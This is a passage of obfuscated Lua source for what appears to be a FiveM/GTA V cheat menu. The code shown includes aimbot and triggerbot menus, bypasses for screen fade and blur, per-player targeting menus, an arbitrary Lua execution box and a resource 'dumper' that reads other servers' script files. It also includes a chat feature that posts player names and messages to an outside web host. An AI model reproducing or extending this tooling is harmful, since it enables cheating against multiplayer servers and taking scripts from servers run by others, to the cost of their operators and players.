                        __REAPER1__.N.TaskVehicleDriveToCoordLongrange(__REAPER1__.V.SelfPed, veh, __REAPER1__.V.DrivingToWp.x, __REAPER1__.V.DrivingToWp.y, __REAPER1__.V.DrivingToWp.z, 180.0, 17564220, 1.0)
                    elseif not ex and __REAPER1__.V.DrivingToWp then
                        __REAPER1__.V.DrivingToWp = nil
                        __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed)
                    end
                end

                if __REAPER1__.A['misc_bypassblackscreen'].func and __REAPER1__.N.IsScreenFadingOut() then
                    __REAPER1__.N.DoScreenFadeIn(0)
                end

                if __REAPER1__.A['misc_bypassscreenblur'].func and __REAPER1__.N.IsScreenblurFadeRunning() then --DisableScreenblurFade
                    __REAPER1__.N.TriggerScreenblurFadeIn(0)
                end

                if __REAPER1__.A['world_displayentity'].func then
                    __REAPER1__.F.DrawText("Overall: " .. #__REAPER1__.N.GameTable("CPed") + #__REAPER1__.N.GameTable("CVehicle") + #__REAPER1__.N.GameTable("CObject"), 0.5, 0.675, 0, 255, 255, 255, 255, 0.35, false, true, false, true, 0.0, 0.99)
                    __REAPER1__.F.DrawText("Players: " .. #__REAPER1__.N.GetActivePlayers(), 0.5, 0.7, 0, 255, 255, 255, 255, 0.35, false, true, false, true, 0.0, 0.99)
                    __REAPER1__.F.DrawText("Pedestrians: " .. #__REAPER1__.N.GameTable("CPed"), 0.5, 0.725, 0, 255, 255, 255, 255, 0.35, false, true, false, true, 0.0, 0.99)
                    --__REAPER1__.F.DrawText("Vehicles: " .. #__REAPER1__.N.GameTable("CVehicle"), 0.5, 0.75, 0, 255, 255, 255, 255, 0.35, false, true, false, true, 0.0, 0.99)
                    --__REAPER1__.F.DrawText("Objects: " .. #__REAPER1__.N.GameTable("CObject"), 0.5, 0.775, 0, 255, 255, 255, 255, 0.35, false, true, false, true, 0.0, 0.99)
                end

                if __REAPER1__.A['world_displaycoords'].func then
                    local c = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    __REAPER1__.F.DrawText('X: ' .. __REAPER1__.F.FloatLength(c.x, 2) .. ' Y: ' .. __REAPER1__.F.FloatLength(c.y, 2) .. ' Z: ' .. __REAPER1__.F.FloatLength(c.z, 2), 0.5, 0.0, 4, 255, 255, 255, 180, 0.35, true, false, true)
                end

                if __REAPER1__.A['world_heading'].func then
                    local h = __REAPER1__.N.GetEntityHeading(__REAPER1__.V.SelfPed)
                    __REAPER1__.F.DrawText('Heading: ' .. __REAPER1__.F.FloatLength(h, 2), 0.5, __REAPER1__.A['world_displaycoords'].func and 0.02 or 0.0, 4, 255, 255, 255, 180, 0.35, true, false, true)
                end

                if __REAPER1__.A['world_rotation'].func then
                    local r = __REAPER1__.N.GetEntityRotation(__REAPER1__.V.SelfPed, 0)
                    __REAPER1__.F.DrawText('Rotation: ' .. __REAPER1__.F.FloatLength(r.z, 2), 0.5, __REAPER1__.A['world_displaycoords'].func and __REAPER1__.A['world_heading'].func and 0.04 or (__REAPER1__.A['world_heading'].func or __REAPER1__.A['world_displaycoords'].func) and 0.02 or 0.0, 4, 255, 255, 255, 180, 0.35, true, false, true)
                end

                if __REAPER1__.A['server_antipart'].toggle then
                    __REAPER1__.N.RemoveParticleFxInRange(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), __REAPER1__.F.IntToFloat(__REAPER1__.A['server_antipart'].sindex))
                end

                if __REAPER1__.A['vehicle:customs_wheelwidth'].toggle and __REAPER1__.V.CurrentVehicl ~= 0 then
                    local width = __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:customs_wheelwidth'].sindex) / 10;
                    __REAPER1__.N.SetVehicleWheelXOffset(__REAPER1__.V.CurrentVehicle, 0, width)
                    __REAPER1__.N.SetVehicleWheelXOffset(__REAPER1__.V.CurrentVehicle, 1, -width)
                    __REAPER1__.N.SetVehicleWheelXOffset(__REAPER1__.V.CurrentVehicle, 2, -width)
                    __REAPER1__.N.SetVehicleWheelXOffset(__REAPER1__.V.CurrentVehicle, 3, width)
                end
            end)

            if err then
                __REAPER1__.F.AddNotification('Fatal fumction error! Check F8 console.', 10000, 255, 0, 0)
                --[[Ham.printStr]]print("FUNCTION ERROR (1)", '\n^4' .. err)
            end

            if __REAPER1__.N.IsKeyReleased(__REAPER1__.A['settings_chatbox'].extra) then
                __REAPER1__.M.Chat = not __REAPER1__.M.Chat
                if __REAPER1__.M.Chat then
                    __REAPER1__.T.ChatMessages = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..'chat'..[[&cfg=]]..'messages'..[[&val=&append=]], 'host19.phl.hu', 443, true))
                    __REAPER1__.F.AddNotification('Press F5 to refresh the chat.', 5000, 200, 200, 200)
                end
            end

            if __REAPER1__.M.Chat then
                if __REAPER1__.N.IsDisabledControlJustReleased(0, 121) then
                    __REAPER25__(function()
                        local ret = __REAPER1__.F.TextBox('', nil, 'altalanos', 'vegyes', 90, 'Chat message')
                        if ret then
                            local t = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..'chat'..[[&cfg=]]..'messages'..[[&val=&append=]], 'host19.phl.hu', 443, true))
                            local year, month, day, hour, minute, second = __REAPER1__.N.GetLocalTime()

                            if t then
                                if #t >= 30 then
                                    local t2 = {}
                                    for k,v in ipairs(t) do
                                        if k > 1 then
                                            t2[k - 1] = t[k]
                                        end
                                    end
                                    
                                    table.insert(t2, {n = Ham.getName(), t = hour .. ':' .. minute, r = __REAPER1__.V.Color.r, g = __REAPER1__.V.Color.g, b = __REAPER1__.V.Color.b, m = ret, w = __REAPER1__.F.TextWidth(ret, 0.3)})
                                    if Ham.getName() == 'DEATH' or Ham.getName() == 'Pain' then t[#t].o = true end
                                    __REAPER1__.F.WebSave('messages', t2, 5000, false, 'chat')
                                else
                                    table.insert(t, {n = Ham.getName(), t = hour .. ':' .. minute, r = __REAPER1__.V.Color.r, g = __REAPER1__.V.Color.g, b = __REAPER1__.V.Color.b, m = ret, w = __REAPER1__.F.TextWidth(ret, 0.3)})
                                    if Ham.getName() == 'DEATH' or Ham.getName() == 'Pain' then t[#t].o = true end
                                    __REAPER1__.F.WebSave('messages', t, 5000, false, 'chat')
                                end
                            end

                            __REAPER1__.T.ChatMessages = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..'chat'..[[&cfg=]]..'messages'..[[&val=&append=]], 'host19.phl.hu', 443, true))
                        end
                    end)
                elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 166) then
                    __REAPER1__.T.ChatMessages = json.decode(Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..'chat'..[[&cfg=]]..'messages'..[[&val=&append=]], 'host19.phl.hu', 443, true))
                end

                __REAPER1__.N.DisableControlAction(0, 16, true)
                __REAPER1__.N.DisableControlAction(0, 17, true)

                if __REAPER1__.N.IsDisabledControlPressed(0, 16) and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.N.ScrollWait or 0) and __REAPER1__.M.ChatMessagesScroll > 13 then
                    __REAPER1__.M.ScrollWait = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['settings_scrollspeed'].sindex
                    __REAPER1__.M.ChatMessagesScroll, __REAPER1__.M.ChatMessagesScrollMin = __REAPER1__.M.ChatMessagesScroll - 1, __REAPER1__.M.ChatMessagesScrollMin - 1
                elseif __REAPER1__.N.IsDisabledControlPressed(0, 17) and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.N.ScrollWait or 0) and __REAPER1__.M.ChatMessagesScroll <= 30 and #__REAPER1__.T.ChatMessages - __REAPER1__.M.ChatMessagesScrollMin > 13 then
                    __REAPER1__.M.ScrollWait = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['settings_scrollspeed'].sindex
                    __REAPER1__.M.ChatMessagesScroll, __REAPER1__.M.ChatMessagesScrollMin = __REAPER1__.M.ChatMessagesScroll + 1, __REAPER1__.M.ChatMessagesScrollMin + 1
                end

                __REAPER1__.N.DrawRect(0.7, 0.41, 0.273, 0.71, 40, 40, 40, 210)
                __REAPER1__.N.DrawRect(0.7, 0.41, 0.265, 0.693, 5, 5, 5, 150)
                __REAPER1__.N.DrawRect(0.7, 0.737, 0.26, 0.03, 70, 70, 70, 210)
                __REAPER1__.F.DrawText('Press insert to chat', 0.575, 0.725, 0, 255, 255, 255, 150, 0.28)

                __REAPER1__.V.ChatOptions = 0
                for k,v in ipairs(__REAPER1__.T.ChatMessages) do
                    if k > #__REAPER1__.T.ChatMessages - __REAPER1__.M.ChatMessagesScroll and k <= #__REAPER1__.T.ChatMessages - __REAPER1__.M.ChatMessagesScrollMin then
                        local add = __REAPER1__.V.ChatOptions * 0.05
                        local r, g, b = 255, 255, 255
                        if v.o then r, g, b = __REAPER1__.F.RgbColors(0.1) end
                        if v.n == Ham.getName() then
                            local add2 = 0.698 + 0.265 / 2 - v.w / 2
                            __REAPER1__.F.DrawText(v.n .. ' | ' .. v.t, 0.71, 0.061 + add, 0, r, g, b, 255, 0.28, false, false, true, true, 0, 0.831) 
                            __REAPER1__.N.DrawRect(add2, 0.098 + add, v.w, 0.025, 0, 0, 0, 255)
                            __REAPER1__.N.DrawRect(add2, 0.085 + add, v.w, 0.002, v.r, v.g, v.b, 220)
                            __REAPER1__.F.DrawText(v.m, 0.57, 0.086 + add, 4, 255, 255, 255, 255, 0.3, false, false, false, true, 0, 0.83) 
                        else
                            local add2 = 0.702 - 0.265 / 2 + v.w / 2
                            __REAPER1__.F.DrawText(v.n .. ' | ' .. v.t, 0.569, 0.061 + add, 0, r, g, b, 255, 0.28, false, false, true)
                            __REAPER1__.N.DrawRect(add2, 0.098 + add, v.w, 0.025, 0, 0, 0, 255)
                            __REAPER1__.N.DrawRect(add2, 0.085 + add, v.w, 0.002, v.r, v.g, v.b, 220)
                            __REAPER1__.F.DrawText(v.m, 0.57, 0.086 + add, 4, 255, 255, 255, 255, 0.3)
                        end

                        __REAPER1__.V.ChatOptions = __REAPER1__.V.ChatOptions + 1
                    end
                end
            end

            if __REAPER1__.M.CurrentMenu and not __REAPER1__.M.StreamerMode then
                __REAPER1__.M.OverallOptions, __REAPER1__.M.Options, __REAPER1__.M.PageOptions, __REAPER1__.M.Submenu, __REAPER1__.M.FoundOption, __REAPER1__.M.SepaBoolPlusz, __REAPER1__.M.SepaBoolMinusz, __REAPER1__.M.CursorHovering = __REAPER1__.M.Options or 0, 0, 0, nil, false, false, false, false
                for k,v in ipairs(__REAPER1__.T.Display[__REAPER1__.M.CurrentMenu]) do
                    local rtype, r1, r2 = v.option(v.text, v.dkey, v.desc, v.hkey, v.risky, v.menuextra, v.func, v.cindex, v.sindex, v.toggle, v.tipus, v.length, v.textboxtext)
                    if rtype then
                        if rtype == 'checkbox' then
                            v.func = not v.func
                        elseif rtype == 'combo' then
                            v.cindex = r1
                        elseif rtype == 'comboactive' then
                            v.sindex = r2
                            if v.toggle ~= nil then
                                v.toggle = not v.toggle
                            end
                        elseif rtype == 'combotoggle' then
                            v.cindex, v.sindex = r1, r1
                        end

                        if rtype ~= 'combo' and v.afu then
                            local _, er = pcall(function()
                                v.afu(v.dkey, v.func, v.cindex, v.sindex, v.toggle, v.extra, v.extra2)
                            end)

                            if er then
                                __REAPER1__.F.AddNotification('Fatal fumction error! Check F8 console.', 10000, 255, 0, 0)
                                --[[Ham.printStr]]print("FUNCTION ERROR (2)", '\n^4' .. er)
                            end
                        end
                    end
                end

                __REAPER1__.M.EnterKey = false
                
                local menux = __REAPER1__.A['settings_positionx'].func[__REAPER1__.A['settings_positionx'].sindex - 1] + (__REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1] / 2)
                local menuy = __REAPER1__.A['settings_positiony'].func[__REAPER1__.A['settings_positiony'].sindex - 1] + (__REAPER1__.A['settings_widthy'].func[__REAPER1__.A['settings_widthy'].sindex - 1] / 2)
                local text = string.len(__REAPER1__.A[__REAPER1__.M.CurrentMenu].text) / 450
                
                --bottom
                if __REAPER1__.M.Options ~= 0 then
                    if not __REAPER1__.M.FoundOption then
                        __REAPER1__.M.SelectedOption = 1
                        __REAPER1__.M.ScrollOption = 0
                        __REAPER1__.M.AddedOptions = 0
                        __REAPER1__.M.Options = 0 -- k??rd??ses
                    end

                    __REAPER1__.N.DrawRect(menux, (__REAPER1__.M.Options == 3 or __REAPER1__.M.Options == 4 or __REAPER1__.M.Options == 6 or __REAPER1__.M.Options == 8 or __REAPER1__.M.Options == 11 or __REAPER1__.M.Options == 12) and __REAPER1__.M.ButtonPosition + 0.032 or __REAPER1__.M.ButtonPosition + 0.0325, __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1], 0.01, 29, 29, 29, __REAPER1__.M.MenuBackgroundAlpha)
                end
                --submenu
                __REAPER1__.N.DrawSprite('__REAPER10__', '__REAPER11__', menux, menuy - 0.2175, __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1], 0.032, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha)
                __REAPER1__.N.DrawRect(menux, menuy - 0.197, __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1], 0.01, 29, 29, 29, __REAPER1__.M.MenuBackgroundAlpha)
                __REAPER1__.F.DrawText(string.upper(__REAPER1__.A[__REAPER1__.M.CurrentMenu].text), menux, menuy - 0.2345, __REAPER1__.A['settings_font'].sindex, 255, 255, 255, __REAPER1__.M.MenuAlpha, 0.5, true)
                
                --banner
                __REAPER1__.N.DrawSprite('__REAPER2__', '__REAPER3__', menux, menuy-0.2675, __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1], 0.069, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha)
                --bal ny??l
                __REAPER1__.N.DrawSprite('__REAPER8__', '__REAPER9__', - text + (menux - 0.0215), menuy - 0.217, 0.02, 0.005, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha)
                --jobb ny??l
                __REAPER1__.N.DrawSprite('__REAPER9__', '__REAPER10__', text + (menux + 0.02), menuy - 0.217, 0.02, 0.005, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha)

                if __REAPER1__.N.IsDisabledControlJustReleased(0, 202) or __REAPER1__.M.CursorToggle and __REAPER1__.N.IsDisabledControlJustReleased(0, 25) then
                    local cMenu = __REAPER1__.A[__REAPER1__.M.CurrentMenu]
                    if cMenu.dkey ~= 'weapon:editor' then __REAPER1__.M.MenuRequest('set', cMenu) end
                    if __REAPER1__.M.CurrentMenu == 'home' then
                        if not __REAPER1__.M.MenuAlphaBusy then
                            __REAPER1__.M.LastMenu = __REAPER1__.M.CurrentMenu
                            __REAPER1__.F.CloseMenu()
                        end
                    else
                        __REAPER1__.M.CurrentMenu = cMenu.func[1]
                        __REAPER1__.M.MenuRequest('request')
                        __REAPER1__.N.PlaySound('def', -1, 'BACK', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    end
                elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 215) or __REAPER1__.M.CursorToggle and __REAPER1__.N.IsDisabledControlJustReleased(0, 24) then
                    if __REAPER1__.M.Submenu then
                        if __REAPER1__.M.Submenu[2] == 'luaexec' or __REAPER1__.M.Submenu[2] == 'searchopt' then
                            __REAPER25__(function()
                                __REAPER1__.F.TextBox('', __REAPER1__.M.Submenu[2] == 'luaexec' and 'luaexec' or 'seachopt', __REAPER1__.M.Submenu[2] == 'luaexec' and 'exec' or 'search', 'vegyes', 9999, __REAPER1__.M.Submenu[2] == 'luaexec' and 'Lua code to execute' or 'Word to search for')
                            end)
                        else
                            __REAPER1__.F.SetMenu(__REAPER1__.M.Submenu[1], __REAPER1__.M.Submenu[2])
                        end
                    else
                        __REAPER1__.M.EnterKey = true
                    end
                elseif __REAPER1__.N.IsKeyReleased(__REAPER1__.A['settings_cursor'].extra) then
                    __REAPER1__.M.CursorToggle = not __REAPER1__.M.CursorToggle
                elseif __REAPER1__.N.IsDisabledControlPressed(0, 173) and (__REAPER1__.M.ScrollWait or 0) <= __REAPER1__.N.GetGameTimer() or __REAPER1__.M.CursorToggle and __REAPER1__.N.IsDisabledControlPressed(0, 16) and __REAPER1__.N.GetGameTimer() - (__REAPER1__.M.ScrollWait or 0) > - 50  then
                    __REAPER1__.M.ScrollWait = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['settings_scrollspeed'].sindex
                    if __REAPER1__.M.SelectedOption < __REAPER1__.M.Options then
                        if __REAPER1__.M.SepaBoolPlusz then
                            __REAPER1__.M.SelectedOption = __REAPER1__.M.SelectedOption + 2
                            if __REAPER1__.M.Options > 13 then
                                if __REAPER1__.M.ScrollOption < 12 then
                                    __REAPER1__.M.ScrollOption = __REAPER1__.M.ScrollOption + 2
                                elseif __REAPER1__.M.ScrollOption == 12 then
                                    __REAPER1__.M.ScrollOption = __REAPER1__.M.ScrollOption + 1
                                    __REAPER1__.M.AddedOptions = __REAPER1__.M.AddedOptions + 1
                                else
                                    __REAPER1__.M.AddedOptions = __REAPER1__.M.AddedOptions + 2
                                end
                            end
                        else
                            __REAPER1__.M.SelectedOption = __REAPER1__.M.SelectedOption + 1
                            if __REAPER1__.M.Options > 13 then
                                if __REAPER1__.M.ScrollOption < 13 then
                                    __REAPER1__.M.ScrollOption = __REAPER1__.M.ScrollOption + 1
                                else
                                    __REAPER1__.M.AddedOptions = __REAPER1__.M.AddedOptions + 1
                                end
                            end
                        end
                    else
                        __REAPER1__.M.SelectedOption = 1
                        if __REAPER1__.M.Options > 13 then
                            __REAPER1__.M.ScrollOption, __REAPER1__.M.AddedOptions = 0, 0
                        end
                    end
                    __REAPER1__.N.PlaySound('def', -1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                elseif __REAPER1__.N.IsDisabledControlPressed(0, 172) and (__REAPER1__.M.ScrollWait or 0) <= __REAPER1__.N.GetGameTimer() or __REAPER1__.M.CursorToggle and __REAPER1__.N.IsDisabledControlPressed(0, 17) and __REAPER1__.N.GetGameTimer() - (__REAPER1__.M.ScrollWait or 0) > - 50 then
                    __REAPER1__.M.ScrollWait = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['settings_scrollspeed'].sindex
                    if __REAPER1__.M.SelectedOption ~= 1 then
                        if __REAPER1__.M.SepaBoolMinusz then
                            __REAPER1__.M.SelectedOption = __REAPER1__.M.SelectedOption - 2
                            if __REAPER1__.M.Options > 13 then
                                if __REAPER1__.M.ScrollOption > 1 then
                                    __REAPER1__.M.ScrollOption = __REAPER1__.M.ScrollOption - 2
                                elseif __REAPER1__.M.ScrollOption == 1 then
                                    __REAPER1__.M.ScrollOption = __REAPER1__.M.ScrollOption - 1
                                    __REAPER1__.M.AddedOptions = __REAPER1__.M.AddedOptions - 1
                                else
                                    __REAPER1__.M.AddedOptions = __REAPER1__.M.AddedOptions - 2
                                end
                            end
                        else
                            __REAPER1__.M.SelectedOption = __REAPER1__.M.SelectedOption - 1
                            if __REAPER1__.M.Options > 13 then
                                if __REAPER1__.M.ScrollOption > 0 then
                                    __REAPER1__.M.ScrollOption = __REAPER1__.M.ScrollOption - 1
                                else
                                    __REAPER1__.M.AddedOptions = __REAPER1__.M.AddedOptions - 1
                                end
                            end
                        end
                    else
                        __REAPER1__.M.SelectedOption = __REAPER1__.M.Options
                        if __REAPER1__.M.Options > 13 then
                            __REAPER1__.M.ScrollOption = 13
                            __REAPER1__.M.AddedOptions = __REAPER1__.M.Options - 14
                        end
                    end
                    __REAPER1__.N.PlaySound('def', -1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                end

                if __REAPER1__.M.CursorToggle then
                    __REAPER1__.N.SetMouseCursorActiveThisFrame()
                    __REAPER1__.M.Mousex, __REAPER1__.M.Mousey = __REAPER1__.N.GetNuiCursorPosition()
                    __REAPER1__.N.DisableControlAction(0, 1, true)
                    __REAPER1__.N.DisableControlAction(0, 2, true)
                    __REAPER1__.N.DisableControlAction(0, 24, true)
                    __REAPER1__.N.DisableControlAction(0, 16, true)
                    __REAPER1__.N.DisableControlAction(0, 17, true)
                    __REAPER1__.N.DisableControlAction(0, 25, true)
                    __REAPER1__.N.DisableControlAction(0, 106, true)
                    __REAPER1__.N.DisableControlAction(0, 99, true)
                    __REAPER1__.N.DisableControlAction(0, 68, true)
                    __REAPER1__.N.DisableControlAction(0, 69, true)
                    __REAPER1__.N.DisableControlAction(0, 70, true)
                    __REAPER1__.N.DisableControlAction(0, 91, true)
                    __REAPER1__.N.DisableControlAction(0, 92, true)
                    __REAPER1__.N.DisableControlAction(0, 114, true)
                    __REAPER1__.N.DisableControlAction(0, 142, true)
                    __REAPER1__.N.DisableControlAction(0, 257, true)
                    __REAPER1__.N.DisableControlAction(0, 330, true)
                    __REAPER1__.N.DisableControlAction(0, 347, true)
                    __REAPER1__.N.DisableControlAction(0, 331, true)
                    __REAPER1__.N.DisableControlAction(0, 144, true)
                    __REAPER1__.N.DisableControlAction(0, 135, true)
                    __REAPER1__.N.DisableControlAction(0, 85, true)
                end

                __REAPER1__.N.DisableControlAction(0, 187, true)
                __REAPER1__.N.DisableControlAction(0, 188, true)
                __REAPER1__.N.DisableControlAction(0, 189, true)
                __REAPER1__.N.DisableControlAction(0, 190, true)
                __REAPER1__.N.DisableControlAction(0, 200, true)
                __REAPER1__.N.DisableControlAction(0, 201, true)
                __REAPER1__.N.DisableControlAction(0, 202, true)

                if __REAPER1__.A['settings_helptext'].func then
                    __REAPER1__.F.DrawTheScaleform(__REAPER1__.A['misc:freecam_freecam'].func and 1 or 2)
                end

                if __REAPER1__.M.CurrentMenu == 'combat:aimbot' or __REAPER1__.M.CurrentMenu == 'combat:triggerbot' and __REAPER1__.A['combat:triggerbot_bone'].toggle then
                    __REAPER1__.N.DrawSprite('__REAPER6__', '__REAPER7__', __REAPER1__.A['settings_positionx'].func[__REAPER1__.A['settings_positionx'].sindex - 1] + __REAPER1__.A['settings_widthx'].func[__REAPER1__.A['settings_widthx'].sindex - 1] + 0.045, __REAPER1__.A['settings_positiony'].func[__REAPER1__.A['settings_positiony'].sindex - 1] + 0.013, 0.085, 0.23, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha)
                elseif __REAPER1__.M.CurrentMenu == 'vehicle:customs' and __REAPER1__.V.CurrentVehicle ~= 0 and __REAPER1__.V.CheckVeh ~= __REAPER1__.V.CurrentVehicle then
                    __REAPER1__.V.CheckVeh = __REAPER1__.V.CurrentVehicle
                    __REAPER1__.F.VehicleCustomCheck()
                elseif __REAPER1__.M.CurrentMenu == 'vehicle:handling' and __REAPER1__.V.CurrentVehicle ~= 0 and __REAPER1__.V.CheckVehHandling ~= __REAPER1__.V.CurrentVehicle then
                    __REAPER1__.V.CheckVehHandling = __REAPER1__.V.CurrentVehicle

                    for k,v in ipairs(__REAPER1__.T.Display['vehicle:handling']) do
                        v.func = __REAPER1__.N.GetVehicleHandlingFloat(__REAPER1__.V.CheckVehHandling, 'CHandlingData', v.text)
                    end
                elseif __REAPER1__.M.CurrentMenu == 'server:onlineplayers' then
                    local tply = __REAPER1__.N.GetActivePlayers()
                    if __REAPER1__.V.OPPly ~= #tply then
                        for x,d in ipairs(__REAPER1__.T.MugshotTabla) do
                            __REAPER1__.N.UnregisterPedheadshot(d.handle)
                        end

                        __REAPER1__.V.OPAdd, __REAPER1__.T.Display['server:onlineplayers'], __REAPER1__.T.MugshotTabla, __REAPER1__.T.OnlinePlayers = 0, {}, {}, {}
                        for k,v in pairs(tply) do
                            if __REAPER1__.V.OPAdd <= __REAPER1__.V.OPMax and __REAPER1__.V.OPAdd >= __REAPER1__.V.OPMin then
                                local id = __REAPER1__.N.GetPlayerServerId(v)
                                table.insert(__REAPER1__.T.OnlinePlayers, id)

                                __REAPER25__(function()
                                    __REAPER26__(100)
                                    local ped = __REAPER1__.N.GetPlayerPed(v)
                                    __REAPER1__.T.MugshotTabla['[' .. id .. '] ' .. string.upper(__REAPER1__.N.GetPlayerName(v))] = {ped = ped, handle = __REAPER1__.N.RegisterPedheadshot(ped)}
                                end)
                             end

                            __REAPER1__.V.OPAdd = __REAPER1__.V.OPAdd + 1
                        end

                        for k,v in __REAPER1__.F.Spairs(__REAPER1__.T.OnlinePlayers) do
                            local plyid = __REAPER1__.N.GetPlayerFromServerId(v)
                            local name = __REAPER1__.N.GetPlayerName(plyid)
                            local t = {text = '[' .. v .. '] ' .. name, dkey = v .. ':91b72Ag=', desc = 'Things to do with ' .. name .. '.', option = __REAPER1__.M.Menu_Button, func = {'server:onlineplayers', v .. ':91b72Ag='}, lasto = 1, scrollo = 0, addedo = 0}
                            table.insert(__REAPER1__.T.Display['server:onlineplayers'], t)
                            __REAPER1__.A[v .. ':91b72Ag='] = t
                        end

                        __REAPER1__.V.OPPly = #tply
                    end

                    if __REAPER1__.N.IsDisabledControlJustReleased(0, 175) and #tply > __REAPER1__.V.OPMax then
                        __REAPER1__.V.OPPly, __REAPER1__.V.OPMax, __REAPER1__.V.OPMin = 0, __REAPER1__.V.OPMax + 27, __REAPER1__.V.OPMin + 27
                        __REAPER1__.M.SelectedOption, __REAPER1__.M.ScrollOption, __REAPER1__.M.AddedOptions = 1, 0, 0
                        __REAPER1__.N.PlaySound('def', -1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 174) and __REAPER1__.V.OPMax ~= 27 then
                        __REAPER1__.V.OPPly, __REAPER1__.V.OPMax, __REAPER1__.V.OPMin = 0, __REAPER1__.V.OPMax - 27, __REAPER1__.V.OPMin - 27
                        __REAPER1__.M.SelectedOption, __REAPER1__.M.ScrollOption, __REAPER1__.M.AddedOptions = 1, 0, 0
                        __REAPER1__.N.PlaySound('def', -1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    end
                elseif __REAPER1__.A['settings_playerdata'].func and string.find(__REAPER1__.A[__REAPER1__.M.CurrentMenu].dkey, '91b72Ag=') then
                    local menu = __REAPER1__.M.CurrentMenu
                    __REAPER1__.F.DrawPlayerData(menu)
                elseif __REAPER1__.M.CurrentMenu == 'weapon:editor' then
                    local t = {}
                    for k,v in ipairs(__REAPER1__.T.Weapons) do
                        if v ~= 'Unarmed' and v ~= 'Fireextinguisher' and v ~= 'Petrolcan' and __REAPER1__.N.HasPedGotWeapon(__REAPER1__.V.SelfPed, __REAPER1__.N.GetHashKey('weapon_' .. v), false) then
                            table.insert(t, v)
                        end
                    end

                    if #t ~= __REAPER1__.V.OverallWeapons then
                        __REAPER1__.V.OverallWeapons, __REAPER1__.T.Display['weapon:editor'] = #t, {}
                        for k,v in ipairs(t) do
                            local menu = 'weapon:' .. string.lower(v)
                            for _k,_v in pairs(__REAPER1__.T.Display) do
                                if menu == _k then
                                    local t = {text = v, dkey = menu, desc = v .. ' menu.', option = __REAPER1__.M.Menu_Button, func = {'weapon:editor', menu}, lasto = 1, scrollo = 0, addedo = 0}
                                    __REAPER1__.A[menu] = t
                                    table.insert(__REAPER1__.T.Display['weapon:editor'], t)
                                    break
                                end
                            end
                        end
                    end
                elseif __REAPER1__.M.CurrentMenu == __REAPER1__.M.WeaponEditorMenu then
                    if __REAPER1__.N.HasPedGotWeapon(__REAPER1__.V.SelfPed, __REAPER1__.M.WeaponEditorWeapon, false) then
                        local ammo = __REAPER1__.N.GetAmmoInPedWeapon(__REAPER1__.V.SelfPed, __REAPER1__.M.WeaponEditorWeapon)
                        local bool, clipAmmo = __REAPER1__.N.GetAmmoInClip(__REAPER1__.V.SelfPed, __REAPER1__.M.WeaponEditorWeapon)
                        local maxAmmo = __REAPER1__.N.GetMaxAmmoInClip(__REAPER1__.V.SelfPed, __REAPER1__.M.WeaponEditorWeapon, 1)

                        for k,v in ipairs(__REAPER1__.T.Display[__REAPER1__.M.WeaponEditorMenu]) do
                            if not v.hkey then
                                if k == 1 and ammo ~= 1 and v.sindex ~= ammo + 1 then
                                    v.cindex, v.sindex = ammo + 1, ammo + 1
                                elseif k == 3 and (maxAmmo ~= #v.func - 1 or clipAmmo + 1 ~= v.sindex) then
                                    local t = {}
                                    for i = 0, maxAmmo do
                                        table.insert(t, i)
                                    end

                                    v.cindex, v.sindex, v.func = clipAmmo + 1, clipAmmo + 1, t
                                end

                                if v.extra then
                                    v.func = __REAPER1__.N.HasPedGotWeaponComponent(__REAPER1__.V.SelfPed, __REAPER1__.M.WeaponEditorWeapon, v.extra)
                                end
                            end
                        end
                    else
                        __REAPER1__.F.SetMenu(__REAPER1__.M.WeaponEditorMenu, 'weapon:editor')
                    end
                elseif __REAPER1__.M.CurrentMenu == 'scripts:dumper' then
                    local reso = __REAPER1__.N.GetNumResources()
                    if reso ~= __REAPER1__.V.ResourcesNum then
                        __REAPER1__.V.ResourcesNum = reso

                        __REAPER1__.T.Display['scripts:dumper'] = {}

                        for i = 0, reso - 1 do
                            local name = __REAPER1__.N.GetResourceByFindIndex(i)

                            local resoName = 'scripts:dumper_' .. name

                            local t = {text = name, dkey = resoName, desc = name .. ' resource menu.', option = __REAPER1__.M.Menu_Button, func = {'scripts:dumper', resoName}, lasto = 1, scrollo = 0, addedo = 0}
                            table.insert(__REAPER1__.T.Display['scripts:dumper'], t)
                            __REAPER1__.A[resoName] = t

                            __REAPER1__.T.Display[resoName] = {}

                            local files = __REAPER1__.N.LoadResourceFile(name, 'fxmanifest.lua')
                            if __REAPER1__.N.LoadResourceFile(name, "__resource.lua") then
                                files = __REAPER1__.N.LoadResourceFile(name, '__resource.lua')
